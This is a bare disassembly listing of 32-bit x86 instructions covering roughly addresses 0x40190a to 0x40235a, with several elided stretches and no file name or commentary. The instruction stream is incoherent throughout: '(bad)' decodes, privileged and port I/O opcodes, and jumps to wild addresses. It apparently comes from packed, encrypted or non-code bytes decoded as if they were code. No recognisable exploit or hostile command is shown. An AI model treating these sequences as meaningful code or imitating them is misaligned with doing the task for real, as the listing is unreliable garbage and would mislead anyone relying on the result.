  40190a:	icebp  
  40190b:	cmp    al,ch
  40190d:	sbb    DWORD PTR [eax-0x25],0x54
  401911:	pop    eax
  401912:	add    al,0x47
  401914:	adc    al,0x40
  401916:	sbb    al,0x2c
  401918:	jb     0x40191b
  40191a:	pop    edi
  40191b:	sub    al,0xf7
  40191d:	jne    0x40192f
  40191f:	pop    ebx
  401920:	jbe    0x401963
  401922:	push   esp
  401923:	xchg   ebp,eax
  401924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401925:	neg    DWORD PTR [ebx+ebx*2]
  401928:	jmp    0xe147b030
  40192d:	mov    ch,BYTE PTR [esi]
  40192f:	xor    ecx,ebp
  401931:	div    BYTE PTR [ecx+0x30713e4a]
  401937:	popf   
  401938:	mov    esp,0xe1272bfb
  40193d:	test   dh,0x46
  401940:	xor    dl,al
  401942:	sub    BYTE PTR [ebx-0x4c],bl
  401945:	mov    al,BYTE PTR [eax]
	...
  40196f:	add    cl,bl
  401971:	sub    eax,0x81036cfc
  401976:	test   DWORD PTR [ebx+ebx*1],ebp
  401979:	jmp    0x2a9a8879
  40197e:	neg    ebx
  401980:	push   ss
  401981:	icebp  
  401982:	add    ebx,DWORD PTR [ebx+ebx*2]
  401985:	jmp    0xe9df7348
  40198a:	add    ebx,DWORD PTR [ebx+ebx*2]
  40198d:	jb     0x4019df
  40198f:	and    al,0xd0
  401991:	sti    
  401992:	mov    BYTE PTR [ecx-0x5d],ah
  401995:	cmp    DWORD PTR [edx+0x1e],ebp
  401998:	pushf  
  401999:	cmp    al,0xf8
  40199b:	mov    ebx,0x29f6c126
  4019a0:	push   ebx
  4019a1:	mov    dh,0x51
  4019a3:	adc    al,dl
  4019a5:	and    al,0xfc
  4019a7:	aad    0x99
  4019a9:	in     eax,dx
  4019aa:	add    esi,ecx
  4019ac:	iret   
  4019ad:	lea    eax,[edx+0x5c39a358]
  4019b3:	hlt    
  4019b4:	mov    ?,ecx
  4019b6:	inc    ebx
  4019b7:	sbb    al,0xa3
  4019b9:	sti    
  4019ba:	add    al,0x5f
  4019bc:	pushf  
  4019bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019be:	inc    eax
  4019bf:	je     0x401a1c
  4019c1:	add    cl,ch
  4019c3:	pop    ds
  4019c4:	pop    ebx
  4019c5:	(bad)  
  4019c6:	and    al,0x64
  4019c8:	pop    ebx
  4019c9:	add    cl,ch
  4019cb:	pop    ds
  4019cc:	rcl    BYTE PTR [ebp-0xf],1
  4019cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019d0:	dec    ecx
  4019d1:	lea    ebp,[eax+eax*1+0x0]
	...
  4019fc:	inc    edi
  4019fd:	or     ebp,DWORD PTR [edx-0x18]
  401a00:	dec    edx
  401a01:	es cld 
  401a03:	inc    esi
  401a04:	lods   al,BYTE PTR ds:[esi]
  401a05:	mov    ds:0x9c27b4ff,al
  401a0a:	push   edx
  401a0b:	fnsave [edx]
  401a0d:	or     BYTE PTR es:[ecx-0x62],al
  401a11:	pushf  
  401a12:	jmp    DWORD PTR [esi]
  401a14:	outs   dx,DWORD PTR ds:[esi]
  401a15:	rcl    BYTE PTR [ebp-0xf],1
  401a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a19:	dec    eax
  401a1a:	push   0xffffffe9
  401a1c:	jne    0x401a79
  401a1e:	call   DWORD PTR [ebx+ecx*1-0xdfe8a64]
  401a25:	and    eax,0x474cfe08
  401a2a:	pop    eax
  401a2b:	bound  ecx,QWORD PTR [ebx+eiz*4+0x3]
  401a2f:	xchg   esp,eax
  401a30:	sbb    esp,DWORD PTR [eax-0x30]
  401a33:	pop    edi
  401a34:	fidiv  DWORD PTR [eax-0x40]
  401a37:	mov    al,0xde
  401a39:	push   edx
  401a3a:	add    BYTE PTR [ecx-0x16ffa4e1],dl
  401a40:	(bad)  
  401a41:	cwde   
  401a42:	or     cl,ch
  401a44:	push   0xffffffd0
  401a46:	in     al,dx
  401a47:	push   0xffffffdc
  401a49:	sahf   
  401a4a:	push   eax
  401a4b:	adc    DWORD PTR [eax],edi
  401a4d:	pusha  
  401a4e:	adc    DWORD PTR [ecx],ebp
  401a50:	sbb    BYTE PTR [ebx-0x64a3178e],ah
  401a56:	call   DWORD PTR [eax+ebp*1]
  401a59:	pushf  
  401a5a:	jne    0x401a3d
  401a5c:	ja     0x401a84
  401a5e:	dec    DWORD PTR [esi+0x0]
	...
  401a88:	add    BYTE PTR [ecx+0x7800c04f],cl
  401a8e:	fwait
  401a8f:	enter  0x81c2,0x57
  401a93:	mov    edx,DWORD PTR [ebp+0x7d]
  401a96:	rcl    BYTE PTR [edx],cl
  401a98:	lea    edi,[eax]
  401a9a:	mov    ds:0x4778ff50,eax
  401a9f:	push   DWORD PTR [ebp+0x41]
  401aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aa3:	jne    0x401aad
  401aa5:	repnz or BYTE PTR [eax*4-0x74ece10b],cl
  401aad:	mov    BYTE PTR [ebx+0x2c55453b],ah
  401ab3:	pop    es
  401ab4:	mov    eax,0x5734
  401ab9:	ficomp WORD PTR [edx+ebp*1+0x2b5d2ec0]
  401ac0:	ror    BYTE PTR [ebp+ebx*4+0xc],0x0
  401ac5:	enter  0xece3,0x83
  401ac9:	cmp    DWORD PTR [ebx+0x6bd5056],edx
  401acf:	xchg   ebx,eax
  401ad0:	adc    ebp,eax
  401ad2:	pop    esi
  401ad3:	clc    
  401ad4:	jb     0x401aca
  401ad6:	fwait
  401ad7:	inc    DWORD PTR [ebx+0x74006270]
  401add:	retf   
  401ade:	fstp   TBYTE PTR [ebp+0x8]
  401ae1:	lds    ecx,FWORD PTR [ecx]
  401ae3:	pop    es
  401ae4:	sub    esi,DWORD PTR [ebp+0x30]
  401ae7:	leave  
  401ae8:	ret    0x5ee1
  401aeb:	cmp    DWORD PTR [ebp+0x0],0x0
	...
  401b13:	add    BYTE PTR [eax],al
  401b15:	add    ch,dl
  401b17:	pop    esi
  401b18:	jne    0x401b24
  401b1a:	popf   
  401b1b:	pop    ebp
  401b1c:	add    BYTE PTR [eax],al
  401b1e:	mov    ch,0x30
  401b20:	leave  
  401b21:	ret    0x5ec1
  401b24:	mov    esi,DWORD PTR [ebp-0x6f]
  401b27:	xlat   BYTE PTR ds:[ebx]
  401b28:	inc    ebp
  401b29:	cld    
  401b2a:	test   DWORD PTR [esi+0x0],ebx
  401b2d:	add    BYTE PTR [edi*8-0x6968f7b3],bl
  401b34:	xchg   BYTE PTR [ebp+0x78],al
  401b37:	je     0x401b2e
  401b39:	jne    0x401b47
  401b3b:	jb     0x401b32
  401b3d:	jne    0x401b53
  401b3f:	adc    DWORD PTR [ecx+0x10],edx
  401b42:	cdq    
  401b43:	les    edi,FWORD PTR [edx+0x7]
  401b46:	pop    es
  401b47:	inc    esp
  401b48:	push   ebp
  401b49:	leave  
  401b4a:	pop    esi
  401b4b:	mov    BYTE PTR [ebx],al
  401b4d:	or     ecx,0x2f
  401b50:	add    esi,DWORD PTR [ebp+0x1b]
  401b53:	pop    ebp
  401b54:	les    ebx,FWORD PTR [esi+0x65]
  401b57:	inc    esi
  401b58:	pop    es
  401b59:	add    BYTE PTR [edi+0x2c03f7bf],ah
  401b5f:	pop    ebx
  401b60:	aas    
  401b61:	adc    BYTE PTR [ecx+0x1c01bb3f],ch
  401b67:	test   BYTE PTR [ebx],al
  401b69:	pop    esi
  401b6a:	in     eax,0x45
  401b6c:	pop    es
  401b6d:	add    BYTE PTR [ecx-0x3],dh
  401b70:	out    0x81,al
  401b72:	fsubr  DWORD PTR [ebx-0x1c]
  401b75:	(bad)  
  401b76:	sti    
  401b77:	repz pop ebx
  401b79:	push   0x0
	...
  401ba2:	add    BYTE PTR [eax],cl
  401ba4:	mov    dh,0x43
  401ba6:	add    ah,ah
  401ba8:	adc    eax,0xdde3c302
  401bad:	add    ebp,DWORD PTR [edx+0x1c]
  401bb0:	cs pop es
  401bb2:	push   0x1c
  401bb4:	cs pop es
  401bb6:	push   0x8003841c
  401bbb:	ret    
  401bbc:	cs cld 
  401bbe:	out    0xef,eax
  401bc0:	rol    BYTE PTR [eax+eax*1],cl
  401bc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bc4:	ds lock inc eax
  401bc7:	xor    DWORD PTR [eax-0x7beb3d44],ecx
  401bcd:	pop    ebp
  401bce:	add    BYTE PTR [ecx-0x1313d3a6],ch
  401bd4:	add    ch,cl
  401bd6:	adc    ebx,DWORD PTR [ebx+ebx*2]
  401bd9:	mov    DWORD PTR fs:[ecx+ecx*4-0x66330c72],eax
  401be1:	cld    
  401be2:	out    dx,eax
  401be3:	test   BYTE PTR [edi+0x78],ch
  401be6:	add    al,0x1c
  401be8:	test   ax,0x1279
  401bec:	call   0x458:0x6944eff4
  401bf3:	sbb    al,0x46
  401bf5:	sub    DWORD PTR [ebp-0xd169da2],edi
  401bfb:	leave  
  401bfc:	xchg   edx,eax
  401bfd:	pop    esp
  401bfe:	mov    DWORD PTR [ecx+ecx*4],esi
  401c01:	inc    esi
  401c02:	repz int3 
  401c04:	cdq    
  401c05:	mov    ah,0xff
	...
  401c2f:	add    BYTE PTR [ebx+0x67],al
  401c32:	ss repz and ebx,ebp
  401c36:	lods   al,BYTE PTR ds:[esi]
  401c37:	jmp    0x401c55
  401c39:	push   cs
  401c3a:	xrelease mov DWORD PTR gs:[edi+0x5c0cdd11],edx
  401c42:	jmp    0xe99b39f2
  401c47:	add    esp,ebp
  401c49:	popf   
  401c4a:	icebp  
  401c4b:	add    ecx,DWORD PTR [ecx-0x1c]
  401c4e:	or     eax,0x50034454
  401c53:	push   ss
  401c54:	pop    esp
  401c55:	pop    ebx
  401c56:	icebp  
  401c57:	jne    0x401c76
  401c59:	pushf  
  401c5a:	out    0x5d,al
  401c5c:	push   ds
  401c5d:	add    eax,0x6351f2e9
  401c62:	rcl    DWORD PTR [ecx-0x4331673f],0xde
  401c69:	pop    edi
  401c6a:	jmp    0x19c7c3c7
  401c6f:	dec    esp
  401c70:	xor    al,0xd3
  401c72:	add    bl,bl
  401c74:	pop    edi
  401c75:	pop    ebx
  401c76:	clc    
  401c77:	cmp    esp,DWORD PTR [ecx]
  401c79:	pushf  
  401c7a:	call   DWORD PTR [ebx]
  401c7c:	sbb    BYTE PTR ds:0x63049e00,al
  401c82:	call   0xffd8a99d
  401c87:	mov    al,ds:0x1c005f61
  401c8c:	xrelease xchg BYTE PTR [ebx+0x582b77a5],al
  401c93:	add    DWORD PTR [eax],eax
	...
  401cbd:	push   edx
  401cbe:	ins    DWORD PTR es:[edi],dx
  401cbf:	inc    eax
  401cc0:	jmp    0x2a412a0c
  401cc5:	dec    esi
  401cc6:	cwde   
  401cc7:	jne    0x401cb6
  401cc9:	sahf   
  401cca:	push   ds
  401ccb:	clc    
  401ccc:	cs aam 0x96
  401ccf:	add    cl,ch
  401cd1:	pop    ds
  401cd2:	pop    ebx
  401cd3:	push   0xffffffe9
  401cd5:	cs push cs
  401cd7:	or     al,0x3e
  401cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cda:	(bad)  
  401cdb:	call   0xffd84986
  401ce0:	bound  esi,QWORD PTR [ebx+eiz*2-0x75]
  401ce4:	sti    
  401ce5:	push   cs
  401ce6:	push   cs
  401ce7:	cld    
  401ce8:	push   ds
  401ce9:	test   BYTE PTR [ebx-0x66f86301],dl
  401cef:	push   edx
  401cf0:	icebp  
  401cf1:	mov    eax,0x54e9089c
  401cf6:	in     al,0xec
  401cf8:	cdq    
  401cf9:	push   edi
  401cfa:	add    ebx,DWORD PTR [eax]
  401cfc:	ficomp DWORD PTR [edi+0x5b]
  401cff:	clc    
  401d00:	jnp    0x401d22
  401d02:	pushf  
  401d03:	call   DWORD PTR [ebx+0x18]
  401d06:	cwde   
  401d07:	jne    0x401cfa
  401d09:	out    0xc0,eax
  401d0b:	call   esi
  401d0d:	int    0xa1
  401d0f:	ret    0x1fe5
  401d12:	mov    eax,DWORD PTR cs:[eax]
  401d15:	leave  
  401d16:	adc    eax,0x49361455
  401d1b:	add    BYTE PTR [ebp-0x4f],dh
  401d1e:	aam    0xc2
  401d20:	adc    BYTE PTR [eax],al
	...
  401d4a:	test   DWORD PTR [edx+0xfba1075],ecx
  401d50:	or     al,0xff
  401d52:	xor    BYTE PTR [edi-0x76571919],dl
  401d58:	dec    DWORD PTR [ebx+0x2217330]
  401d5e:	lods   al,BYTE PTR ds:[esi]
  401d5f:	mov    al,ds:0x16100010
  401d64:	in     al,dx
  401d65:	xor    DWORD PTR [ecx+0x7975ff8a],0x35
  401d6c:	add    al,0x8d
  401d6e:	add    BYTE PTR [edi-0x6c8f00b0],0xe7
  401d75:	ret    
  401d76:	jmp    0x8297:0x808bff89
  401d7d:	cmp    BYTE PTR [ebp+0xf],al
  401d80:	pop    es
  401d81:	mov    eax,DWORD PTR [eax-0x2137f079]
  401d87:	pusha  
  401d88:	sub    eax,eax
  401d8a:	cmp    al,0x9d
  401d8c:	or     BYTE PTR [eax],al
  401d8e:	rcl    BYTE PTR [edi],1
  401d90:	in     al,dx
  401d91:	add    DWORD PTR [ecx-0x75],0xffffffff
  401d95:	jne    0x401d90
  401d97:	cmp    BYTE PTR [edx],al
  401d99:	(bad)  
  401d9a:	ror    BYTE PTR [eax+edx*2-0x186d8f01],0x97
  401da2:	jmp    0x8296:0xb08bff8b
  401da9:	cmp    ch,al
  401dab:	push   cs
  401dac:	or     BYTE PTR [edi],cl
	...
  401dd6:	add    BYTE PTR [edx-0x7e7901e3],dh
  401ddc:	mov    bh,0x2
  401dde:	sub    ebx,DWORD PTR [esp+eax*8]
  401de1:	mov    edx,0x568424c2
  401de6:	mov    eax,eax
  401de8:	add    edi,eax
  401dea:	cld    
  401deb:	stos   DWORD PTR es:[edi],eax
  401dec:	dec    edi
  401ded:	add    BYTE PTR [edx+0x1d],ch
  401df0:	inc    DWORD PTR [ebp-0x1]
  401df3:	in     al,dx
  401df4:	les    esi,FWORD PTR [esi+0x8]
  401df7:	test   BYTE PTR [edx-0xf],ch
  401dfa:	dec    DWORD PTR [ebx-0x60f3b9f7]
  401e00:	lods   al,BYTE PTR ds:[esi]
  401e01:	add    esi,DWORD PTR [edx+eiz*1-0x4b]
  401e05:	mov    ecx,0x5e97345
  401e0a:	sub    ebx,DWORD PTR [ebx+ecx*8-0x3b]
  401e0e:	or     BYTE PTR [edi+esi*2],bl
  401e11:	jge    0x401dff
  401e13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e14:	outs   dx,DWORD PTR ds:[esi]
  401e15:	adc    al,0x83
  401e17:	push   ss
  401e18:	test   BYTE PTR [esi+0x4],dh
  401e1b:	push   ebp
  401e1c:	inc    edx
  401e1d:	(bad)  
  401e1e:	inc    DWORD PTR [edx-0x49]
  401e21:	(bad)  
  401e22:	(bad)  
  401e23:	mov    cl,0x7b
  401e25:	fcmovnbe st,st(0)
  401e27:	xor    BYTE PTR ds:0xcf5c0bf0,bl
  401e2d:	cld    
  401e2e:	mov    cl,cl
  401e30:	mov    bl,0xc8
  401e32:	add    bl,BYTE PTR [esp+eax*4]
  401e35:	add    eax,DWORD PTR [eax]
  401e37:	pop    es
  401e38:	(bad)  
  401e39:	pop    ebp
  401e3a:	add    DWORD PTR [eax],eax
	...
  401e64:	or     ebp,edi
  401e66:	(bad)  
  401e67:	dec    BYTE PTR [ecx-0x7c22484]
  401e6d:	fs lock leave 
  401e70:	fimul  WORD PTR [edi+0x67975503]
  401e76:	test   ah,al
  401e78:	loopne 0x401e6f
  401e7a:	jl     0x401ef1
  401e7c:	sub    dl,bl
  401e7e:	add    ecx,DWORD PTR [ebp+0x54e55b59]
  401e84:	retf   
  401e85:	psubw  mm2,QWORD PTR [ebp-0x3d]
  401e89:	psraw  mm3,mm3
  401e8c:	data16 xchg cl,ch
  401e8f:	add    esp,DWORD PTR [edi]
  401e91:	fwait
  401e92:	cmp    eax,0xbd179f06
  401e97:	add    al,0x29
  401e99:	pop    esi
  401e9a:	add    al,ah
  401e9c:	cli    
  401e9d:	mov    ds:0xe21c00ab,eax
  401ea2:	sub    al,0xf0
  401ea4:	pop    ds
  401ea5:	mov    edx,eax
  401ea7:	dec    eax
  401ea8:	sub    al,0x10
  401eaa:	mov    edx,0xe95b1dac
  401eaf:	add    edx,edx
  401eb1:	mov    ds:0x301c00ab,eax
  401eb6:	jb     0x401e98
  401eb8:	popf   
  401eb9:	sahf   
  401eba:	icebp  
  401ebb:	out    dx,al
  401ebc:	pop    ebx
  401ebd:	xchg   ebp,eax
  401ebe:	sbb    bl,BYTE PTR [ebx]
  401ec0:	ja     0x401ec2
  401ec2:	jmp    0xeb413b20
  401ec7:	pop    ecx
	...
  401ef0:	add    BYTE PTR [ecx+eax*1],bl
  401ef3:	jmp    0x33c3:0xe95b1c5b
  401efa:	pmaddwd mm3,mm3
  401efd:	sub    al,0x84
  401eff:	jmp    0x355fb407
  401f04:	inc    esp
  401f05:	nop
  401f06:	sub    BYTE PTR [esi],ch
  401f08:	jns    0x401f2e
  401f0a:	adc    esp,0xffffffed
  401f0d:	or     edx,DWORD PTR [ebp+0x5c044926]
  401f13:	jmp    0xb5203b1b
  401f18:	sti    
  401f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f1a:	imul   esi,DWORD PTR [ecx+ecx*2-0x1c],0x1c83912b
  401f22:	pop    ebx
  401f23:	add    cl,ch
  401f25:	pushf  
  401f26:	fidivr WORD PTR [eax-0x12]
  401f29:	ret    0x5094
  401f2c:	out    0x44,al
  401f2e:	arpl   di,di
  401f30:	cmp    ebx,DWORD PTR [eax+ebx*8]
  401f33:	jge    0x401f06
  401f35:	pop    ds
  401f36:	push   cs
  401f37:	add    ebp,DWORD PTR [edx]
  401f39:	xlat   BYTE PTR ds:[ebx]
  401f3a:	jae    0x401f3b
  401f3c:	cmp    al,0xb8
  401f3e:	out    0x85,al
  401f40:	inc    ecx
  401f41:	mov    bl,0x94
  401f43:	call   FWORD PTR [ecx]
  401f45:	mov    ecx,DWORD PTR [esi]
  401f47:	cld    
  401f48:	shr    eax,0x93
  401f4b:	jmp    DWORD PTR [esi-0x148b2b7a]
  401f51:	data16 (bad) 
  401f53:	call   FWORD PTR [eax+eax*1]
	...
  401f7e:	ins    BYTE PTR es:[edi],dx
  401f7f:	and    DWORD PTR [ebx-0x74a4e081],0xffffffaa
  401f86:	(bad)  
  401f87:	mov    eax,ds:0x2e1ff1c2
  401f8c:	mov    eax,DWORD PTR [ebp+0x6ef89f9e]
  401f92:	aam    0x66
  401f94:	call   0xffd45622
  401f99:	jo     0x401f6f
  401f9b:	xchg   edx,eax
  401f9c:	(bad)  
  401f9d:	lods   al,BYTE PTR ds:[esi]
  401f9e:	dec    ebx
  401f9f:	pop    ebx
  401fa0:	add    cl,ch
  401fa2:	pop    ds
  401fa3:	xchg   esp,eax
  401fa4:	jne    0x401f9b
  401fa6:	inc    edi
  401fa7:	sar    ch,1
  401fa9:	ds xor ah,al
  401fac:	push   ebp
  401fad:	in     eax,0x96
  401faf:	imul   ebp,DWORD PTR [edx-0x17],0x9cff5b75
  401fb6:	sti    
  401fb7:	xchg   ebx,eax
  401fb8:	jne    0x401fdb
  401fba:	repnz or eax,0x67741608
  401fc0:	(bad)  
  401fc1:	mov    ebx,0xc2a223
  401fc6:	in     eax,dx
  401fc7:	push   edi
  401fc8:	push   ebp
  401fc9:	mov    edx,DWORD PTR [ecx]
  401fcb:	fld    st(4)
  401fcd:	clc    
  401fce:	or     ah,BYTE PTR [ebx]
  401fd0:	clc    
  401fd1:	add    ch,al
  401fd3:	push   edi
  401fd4:	add    bh,al
  401fd6:	clc    
  401fd7:	mov    al,BYTE PTR [eax]
  401fd9:	add    BYTE PTR [ebp-0x42aa74a9],dh
  401fdf:	adc    dl,BYTE PTR [edx]
  401fe1:	lea    eax,[eax]
	...
  40200b:	clc    
  40200c:	xchg   BYTE PTR [eax+0x6a],dl
  40200f:	mov    ah,0x86
  402011:	jne    0x40200f
  402013:	bound  ecx,QWORD PTR [ebx]
  402015:	clc    
  402016:	call   FWORD PTR [eax-0x69]
  402019:	(bad)  
  40201a:	push   edx
  40201b:	imul   edx,DWORD PTR [edx],0x98ccf845
  402021:	add    al,0x0
  402023:	dec    eax
  402024:	adc    ch,ah
  402026:	push   0xffffff84
  402028:	adc    al,0x45
  40202a:	or     al,0x35
  40202c:	xchg   BYTE PTR [ebp+0x8],dh
  40202f:	lea    ecx,[ecx-0x4]
  402032:	jmp    edx
  402034:	iret   
  402035:	ret    0x4508
  402038:	sub    al,0x8b
  40203a:	in     al,dx
  40203b:	pop    ds
  40203c:	arpl   WORD PTR [ebp-0xd8aebb],cx
  402042:	jne    0x402091
  402044:	scas   eax,DWORD PTR es:[edi]
  402045:	push   ds
  402046:	cld    
  402047:	rol    BYTE PTR [ebp+0x573dc2c9],cl
  40204d:	push   ebp
  40204e:	mov    edx,ecx
  402050:	fnstcw WORD PTR [ebp+0xc]
  402053:	xor    eax,0xd083140b
  402058:	outs   dx,BYTE PTR ds:[esi]
  402059:	add    BYTE PTR [ebx+esi*8+0x7f],dh
  40205d:	jne    0x40206f
  40205f:	inc    edx
  402060:	or     cl,BYTE PTR [edi+edi*8]
  402063:	test   al,0x96
  402065:	out    0xfd,eax
  402067:	sbb    al,0x6d
  402069:	in     eax,dx
  40206a:	jmp    ebp
  40206c:	inc    esi
	...
  402095:	add    BYTE PTR [eax],al
  402097:	add    BYTE PTR [ecx+0xd],dl
  40209a:	loopne 0x40209b
  40209c:	imul   esi,DWORD PTR [esp+ebp*8-0x4fa3db8b],0x8081d3ff
  4020a7:	jge    0x4020d5
  4020a9:	test   BYTE PTR [edi+0x14],dh
  4020ac:	lahf   
  4020ad:	das    
  4020ae:	add    BYTE PTR [eax],al
  4020b0:	xor    BYTE PTR [edx-0x14],bh
  4020b3:	jne    0x4020c1
  4020b5:	mov    eax,ds:0x4fab0c76
  4020ba:	cld    
  4020bb:	out    0x6b,eax
  4020bd:	shr    esp,1
  4020bf:	jmp    DWORD PTR [ebp-0x3a]
  4020c2:	(bad)  
  4020c3:	(bad)  
  4020c4:	call   0x9c3ffc5
  4020c9:	mov    BYTE PTR [ebx],al
  4020cb:	je     0x4020e3
  4020cd:	icebp  
  4020ce:	jbe    0x4020dc
  4020d0:	test   BYTE PTR [esi],dh
  4020d2:	fiadd  WORD PTR [eax]
  4020d4:	sbb    al,0xdd
  4020d6:	add    DWORD PTR [ebx],ebp
  4020d8:	pop    esp
  4020d9:	je     0x4020c8
  4020db:	jne    0x4020ed
  4020dd:	adc    DWORD PTR [esi+0x8],esi
  4020e0:	inc    esp
  4020e1:	push   ebp
  4020e2:	in     al,dx
  4020e3:	call   DWORD PTR [ebx-0x45]
  4020e6:	ror    DWORD PTR [eax],0x1c
  4020e9:	iret   
  4020ea:	js     0x4020d8
  4020ec:	inc    ebx
  4020ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020ee:	sti    
  4020ef:	out    0x3,eax
  4020f1:	sub    esp,ebp
  4020f3:	dec    esp
  4020f5:	popf   
  4020f6:	sti    
  4020f7:	addr16 leave 
  4020f9:	retf   
  4020fa:	inc    edx
	...
  402123:	add    BYTE PTR [eax],al
  402125:	and    eax,edi
  402127:	sti    
  402128:	out    0x8f,eax
  40212a:	dec    ecx
  40212b:	in     al,dx
  40212c:	inc    DWORD PTR [esi+0x1475ec84]
  402132:	pop    ebx
  402133:	adc    DWORD PTR [edi+0x3],edx
  402136:	xchg   edx,eax
  402137:	push   ds
  402138:	pop    ecx
  402139:	push   ds
  40213a:	loopne 0x4020e8
  40213c:	jmp    DWORD PTR [ebx-0x6e]
  40213f:	xchg   esp,eax
  402140:	sti    
  402141:	add    esi,DWORD PTR [esi]
  402143:	push   es
  402144:	in     al,dx
  402145:	jecxz  0x40214b
  402147:	jmp    0x4021c7
  402149:	popa   
  40214a:	imul   ebx,DWORD PTR [ecx+0x16349ec],0x3e
  402151:	retf   
  402152:	xchg   ecx,eax
  402153:	out    0x4c,al
  402155:	aad    0x9c
  402157:	in     eax,dx
  402158:	add    edx,DWORD PTR [ecx-0x1a]
  40215b:	lds    eax,FWORD PTR [edi+0x71ce8ed8]
  402161:	adc    al,0x83
  402163:	sbb    esi,ebp
  402165:	mov    ds:0x28411291,eax
  40216a:	in     al,0x2c
  40216c:	call   0xfc1d3910
  402171:	cmc    
  402172:	pop    edx
  402173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402174:	jno    0x402186
  402176:	xchg   edx,eax
  402177:	adc    al,0xfc
  402179:	sbb    DWORD PTR [edx-0x6d],0xffffffeb
  40217d:	jae    0x402110
  40217f:	adc    al,0xe8
  402181:	imul   eax,DWORD PTR [edi],0xfffffff1
  402184:	fistp  DWORD PTR [edi]
  402186:	xchg   edx,eax
  402187:	jle    0x402174
	...
  4021b1:	add    BYTE PTR [ebx+0x7],bl
  4021b4:	loope  0x402191
  4021b6:	or     BYTE PTR [edi+0x1797eb6e],cl
  4021bc:	gs mov ebp,0x50e9625e
  4021c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021c3:	jle    0x40222f
  4021c5:	shr    BYTE PTR [eax],0x99
  4021c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021c9:	out    dx,eax
  4021ca:	sbb    al,0x5b
  4021cc:	jmp    0x3d57b2d4
  4021d1:	push   esp
  4021d2:	sbb    eax,DWORD PTR [edi]
  4021d4:	add    cl,ah
  4021d6:	idiv   DWORD PTR [ecx]
  4021d8:	out    dx,al
  4021d9:	jmp    0xa200f7fd
  4021de:	and    al,0x90
  4021e0:	jne    0x4021d3
  4021e2:	xlat   BYTE PTR ds:[ebx]
  4021e3:	xchg   ebp,eax
  4021e4:	stc    
  4021e5:	push   ss
  4021e6:	pop    es
  4021e7:	jecxz  0x40222e
  4021e9:	adc    edi,esi
  4021eb:	push   es
  4021ec:	cld    
  4021ed:	adc    edi,eax
  4021ef:	jg     0x4021f1
  4021f1:	jmp    0xdfb4f2d0
  4021f6:	mov    BYTE PTR [esi],0xf8
  4021f9:	cdq    
  4021fa:	imul   ebx,DWORD PTR [ebx-0x18],0x5b1d58
  402201:	jo     0x40225f
  402203:	xchg   edi,edi
  402205:	pop    esp
  402206:	les    eax,FWORD PTR [ebx+0x5b1fbddb]
  40220c:	(bad)  
  40220d:	cmp    al,0xa0
  40220f:	js     0x4021ec
  402211:	ret    0x9086
  402214:	mov    ebp,DWORD PTR [eax+eax*1]
	...
  40223f:	mov    WORD PTR [eax-0x38],fs
  402242:	mov    dh,0x6f
  402244:	sub    edi,edi
  402246:	sbb    al,0x80
  402248:	js     0x4021dc
  40224a:	lahf   
  40224b:	xchg   BYTE PTR [eax-0x6f8c5437],dl
  402251:	push   esp
  402252:	bound  edx,QWORD PTR [ebx-0x24]
  402255:	les    edi,FWORD PTR [ecx+0x5e]
  402258:	push   ss
  402259:	hlt    
  40225a:	jmp    0x64407d7e
  40225f:	fmul   QWORD PTR [esi+0x62cc6e50]
  402265:	call   0x9b8693
  40226a:	fs pop edi
  40226c:	adc    ecx,DWORD PTR [ebp+0x56]
  40226f:	lods   al,BYTE PTR ds:[esi]
  402270:	(bad)  
  402271:	call   0xffd05aeb
  402276:	add    BYTE PTR [edx+ebx*1-0x7c277c08],ch
  40227d:	add    al,0x72
  40227f:	sbb    eax,ebx
  402281:	ins    DWORD PTR es:[edi],dx
  402282:	clc    
  402283:	add    DWORD PTR [ebp+0x52dfc75],eax
  402289:	in     al,dx
  40228a:	add    BYTE PTR ds:0xd774bf91,al
  402290:	test   BYTE PTR [ebp-0x8],dh
  402293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402294:	sub    eax,0x5af4e800
  402299:	add    BYTE PTR [eax],al
  40229b:	retf   0xf7d3
  40229e:	sar    BYTE PTR [ebx+ebx*1],1
  4022a1:	hlt    
  4022a2:	inc    DWORD PTR [eax]
	...
  4022cc:	push   eax
  4022cd:	js     0x4022b7
  4022cf:	addr16 jmp 0xb42b232b
  4022d5:	xor    BYTE PTR [ebp+0x8],0xdd
  4022d9:	das    
  4022da:	sti    
  4022db:	(bad)  
  4022dc:	fisubr DWORD PTR [ebp-0x40]
  4022df:	leave  
  4022e0:	ja     0x40233c
  4022e2:	add    bl,ch
  4022e4:	sub    DWORD PTR [esi-0x40],0xffffffc9
  4022e8:	(bad)  
  4022e9:	pop    edx
  4022ea:	add    BYTE PTR [edx+0x77],ch
  4022ed:	sub    eax,0x8f20fffc
  4022f2:	out    0x4,eax
  4022f4:	mov    esp,0x40c7ff81
  4022f9:	xchg   DWORD PTR [ecx],eax
  4022fb:	add    BYTE PTR [ebp+0x5b],dh
  4022fe:	lea    eax,[ebp-0x1b]
  402301:	push   DWORD PTR es:[ebp+0x4d]
  402305:	mov    bl,0xfa
  402307:	sti    
  402308:	retf   0x8381
  40230b:	jge    0x4022d2
  40230d:	push   esi
  40230e:	je     0x402322
  402310:	dec    edx
  402311:	sar    DWORD PTR [ebx],cl
  402313:	inc    ebp
  402314:	sar    edi,1
  402316:	push   es
  402317:	mov    eax,0x3831c
  40231c:	sbb    al,0x1d
  40231e:	add    ch,BYTE PTR [ebx]
  402320:	pop    esp
  402321:	sub    al,0x6
  402323:	sub    ebx,esp
  402325:	dec    ebx
  402326:	mov    BYTE PTR [esp+ebx*1],0xef
  40232a:	jl     0x402318
  40232c:	lahf   
  40232d:	cmp    ah,ch
  40232f:	lea    eax,[eax]
	...
  402359:	pop    ecx
  40235a:	cmp    BYTE PTR [edi+edi*8+0x71],dl
